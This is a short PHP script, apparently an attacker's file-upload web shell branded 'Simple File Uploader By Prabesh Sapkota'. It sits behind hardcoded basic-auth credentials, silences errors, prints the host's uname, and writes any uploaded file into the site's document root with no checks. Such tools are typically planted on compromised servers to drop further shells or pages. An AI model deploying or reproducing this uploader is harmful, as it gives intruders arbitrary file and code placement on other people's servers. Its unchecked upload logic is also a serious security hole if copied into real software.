<?php
error_reporting(0); 

define('USE_AUTHENTICATION', 1);

define('USERNAME', 'user');

define('PASSWORD', 'pass');


if (USE_AUTHENTICATION == 1) {

    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != USERNAME || $_SERVER['PHP_AUTH_PW'] != PASSWORD){

        header('WWW-Authenticate: Basic realm="Login to access!"');

        header('HTTP/1.0 401 Unauthorized');

        exit('<center><h1>Access Denied!</h1></center>');

    }

    else{
echo "<center><b>Simple File Uploader By Prabesh Sapkota</b><br><br>";
echo "Uname: ".php_uname()."<br><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='updlf[]' multiple><br><br>
	  <input type='submit' name='upload' value='upload'>
	  </form></center>";

if(isset($_POST['upload'])) {
	$root = $_SERVER['DOCUMENT_ROOT'];
	foreach ($_FILES['updlf']['tmp_name'] as $key => $value) {
		
	$files = $_FILES['updlf']['name'][$key];
	$dest = $root.'/'.$files;
	
	if(is_writable($root) && !file_exists($dest)) {
		if(@copy($_FILES['updlf']['tmp_name'][$key], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "<center>Upload Sucessfull :) -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a><br></center>";
		} else {
			echo "<center>Could not upload the file, ".$files." :(</center>";
		}
	} else {
		if (!file_exists($files)) {
		if(@copy($_FILES['updlf']['tmp_name'][$key], $files)) {
			echo "<center>Your file : <b>$files</b> have been uploaded in the same folder</center><br>";
		} else {
			echo "<center>".$files." -_-</center>";
		}
		}else{
			echo "<center>".$files." Already Exists ^-^ </center>";
		}
	}
}}
	
    }

}
?>
